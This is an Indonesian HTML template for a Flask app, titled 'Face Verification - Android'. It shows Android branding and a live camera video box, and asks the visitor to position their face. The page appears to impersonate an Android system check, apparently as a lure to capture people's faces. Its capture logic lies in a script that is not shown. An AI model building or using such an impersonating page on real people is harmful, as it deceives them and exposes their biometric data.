<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Wajah - Android</title>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <div class="verification-container">
        <img src="{{ url_for('static', filename='android_logo.png') }}" class="android-logo" alt="Android">
        <h1>Verifikasi Wajah</h1>
        <p class="status-message">Posisikan wajah Anda di dalam lingkaran</p>
        
        <div class="face-scan-box">
            <video id="video" autoplay muted playsinline></video>
            <div class="scan-effect"></div>
        </div>
        
        <button class="btn-retry">Coba Lagi</button>
        <p style="font-size: 12px; color: #9aa0a6;">Pastikan wajah terlihat jelas dan pencahayaan cukup</p>
    </div>

    <script src="{{ url_for('static', filename='script.js') }}"></script>
</body>
</html>
